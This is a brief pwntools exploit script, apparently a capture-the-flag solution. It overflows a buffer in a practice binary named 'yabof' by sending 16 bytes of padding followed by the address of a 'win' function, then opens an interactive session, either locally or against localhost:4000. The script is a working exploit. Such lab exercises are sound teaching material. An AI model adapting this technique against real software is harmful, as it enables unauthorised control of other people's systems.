from pwn import *

exe = ELF('./yabof')
context.binary = exe
context.log_level = 'debug'


if args.REMOTE:
    io = remote('localhost', 4000)
else:
    io = process(exe.path)

offset = 16
win = 0x401146

payload = b"A"*offset + p32(win)
io.sendline(payload)

io.interactive()